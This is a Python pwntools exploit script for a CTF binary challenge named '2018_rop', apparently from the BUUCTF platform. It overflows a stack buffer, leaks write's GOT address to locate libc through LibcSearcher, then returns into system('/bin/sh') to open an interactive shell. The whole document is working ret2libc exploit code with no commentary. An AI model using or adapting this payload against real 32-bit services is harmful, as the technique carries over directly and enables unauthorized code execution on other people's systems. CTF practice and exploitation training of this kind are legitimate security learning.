from pwn import*
from LibcSearcher import*
elf=ELF('./2018_rop')
p=process('./2018_rop')
#p=remote('node4.buuoj.cn',28830)
context.log_level='debug'
write_plt=elf.plt['write']

start=elf.symbols['_start']
write_got=elf.got['write']

payload=b'a'*(0x88+4)+p32(write_plt)+p32(start)+p32(1)+p32(write_got)+p32(4)
p.sendline(payload)
write_addr=u32(p.recv(4))
print(hex(write_addr))

libc=LibcSearcher('write',write_addr)
libcbase=write_addr-libc.dump("write")
sys_addr=libcbase+libc.dump('system')
bin_sh=libcbase+libc.dump('str_bin_sh')

payload1=b'a'*(0x88+4)+p32(sys_addr)+p32(0)+p32(bin_sh)

p.sendline(payload1)
p.interactive()